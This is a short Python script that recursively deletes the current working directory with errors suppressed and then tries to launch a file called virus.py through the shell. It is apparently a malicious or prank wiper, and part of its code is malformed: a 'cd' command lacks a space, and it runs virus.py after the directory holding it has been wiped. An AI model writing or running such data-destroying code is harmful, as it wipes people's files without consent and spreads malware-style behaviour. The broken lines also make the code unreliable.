import os
import shutil
cwd = os.getcwd()
shutil.rmtree(cwd, True, True)
os.system(r"cd" + cwd)
os.system(r"virus.py")
